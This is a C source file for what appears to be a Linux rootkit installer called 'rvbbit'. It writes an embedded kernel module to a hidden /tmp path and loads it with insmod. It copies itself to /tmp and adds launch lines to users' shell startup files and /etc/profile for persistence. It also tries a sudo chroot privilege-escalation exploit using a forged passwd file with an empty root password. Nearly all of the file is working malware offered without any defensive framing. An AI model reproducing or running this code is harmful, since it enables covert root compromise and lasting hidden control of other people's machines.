#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdarg.h>

extern unsigned char rvbbit_ko[];
extern unsigned int rvbbit_ko_len;

int is_root() { return geteuid() == 0; }
int file_exists(const char *path) { return access(path, F_OK) == 0; }

int cmd(const char *fmt, ...)
{
    va_list ap; char buf[512];
    va_start(ap, fmt); vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
    return system(buf);
}

void write_file(const char *path, const char *data)
{
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0700);
    if (fd >= 0) { write(fd, data, strlen(data)); close(fd); }
}

void append_file(const char *path, const char *data)
{
    int fd = open(path, O_WRONLY | O_CREAT | O_APPEND, 0700);
    if (fd >= 0) { write(fd, data, strlen(data)); close(fd); }
}

int load_module()
{
    if (!file_exists("/tmp/.rvbbit.ko")) {
        int fd = open("/tmp/.rvbbit.ko", O_WRONLY | O_CREAT | O_TRUNC, 0600);
        if (fd < 0) return -1;
        write(fd, rvbbit_ko, rvbbit_ko_len); close(fd);
    }
    return cmd("/sbin/insmod /tmp/.rvbbit.ko 2>/dev/null");
}

void install_user_persistence()
{
    const char *home = getenv("HOME"); if (!home) return;
    char path[256];
    snprintf(path, sizeof(path), "%s/.bashrc", home); append_file(path, "\n/tmp/.rvbbit_installer &\n");
    snprintf(path, sizeof(path), "%s/.profile", home); append_file(path, "\n/tmp/.rvbbit_installer &\n");
    append_file("/etc/profile", "\n/tmp/.rvbbit_installer &\n");
}

int exploit_sudo_chroot()
{
    if (!file_exists("/usr/bin/sudo")) return 0;
    if (system("sudo --version 2>/dev/null | head -1 | grep -E '1\\.9\\.(1[4-7])'") != 0) return 0;
    mkdir("/tmp/.rvbbit_root", 0755); mkdir("/tmp/.rvbbit_root/etc", 0755);
    write_file("/tmp/.rvbbit_root/etc/nsswitch.conf", "passwd: files\nshadow: files\ngroup: files\nhosts: files\n");
    write_file("/tmp/.rvbbit_root/etc/passwd", "root::0:0:root:/root:/bin/sh\n");
    write_file("/tmp/.rvbbit_root/rvbbit_payload.sh", "#!/bin/sh\n/sbin/insmod /tmp/.rvbbit.ko\n");
    cmd("chmod +x /tmp/.rvbbit_root/rvbbit_payload.sh");
    return cmd("sudo -R /tmp/.rvbbit_root /bin/sh -c '/tmp/.rvbbit_root/rvbbit_payload.sh'") == 0;
}

int main(int argc, char *argv[])
{
    if (!file_exists("/tmp/.rvbbit_installer")) {
        char self[256]; readlink("/proc/self/exe", self, sizeof(self)-1);
        cmd("cp %s /tmp/.rvbbit_installer", self);
    }
    if (is_root()) { load_module(); return 0; }
    if (exploit_sudo_chroot()) return 0;
    install_user_persistence();
    if (!file_exists("/tmp/.rvbbit.ko")) {
        int fd = open("/tmp/.rvbbit.ko", O_WRONLY | O_CREAT | O_TRUNC, 0600);
        if (fd >= 0) { write(fd, rvbbit_ko, rvbbit_ko_len); close(fd); }
    }
    return 1;
}